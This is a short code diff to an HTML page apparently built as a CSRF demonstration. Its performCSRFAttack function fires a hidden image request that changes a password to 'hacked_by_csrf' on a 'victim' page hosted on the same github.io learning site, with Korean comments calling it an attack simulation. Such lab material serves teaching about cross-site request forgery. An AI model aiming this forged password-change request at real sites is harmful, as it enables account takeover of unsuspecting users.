@@ -49,11 +49,11 @@
     <script>
         function performCSRFAttack() {
             const attackResult = document.getElementById('attackResult');
-            const victimSiteURL = "https://kdg124.github.io/hackinup/vic_csrf.html"; 
+            const victimSiteURL = "https://kdg124.github.io/hackinup"; 
             
             // GET 요청을 이용한 CSRF 공격 시뮬레이션
             const img = new Image();
-            img.src = victimSiteURL + "/victim-site.html?action=changePass&new_password=hacked_by_csrf";
+            img.src = victimSiteURL + "/vic_csrf.html?action=changePass&new_password=hacked_by_csrf";
             img.onload = () => {
                 attackResult.innerHTML = "<p style='color: red;'>CSRF 공격 요청이 전송되었습니다! 피해자 사이트에서 비밀번호가 변경되었는지 확인하세요.</p>";
             };
@@ -78,3 +78,4 @@
 </body>
 
 </html>
+
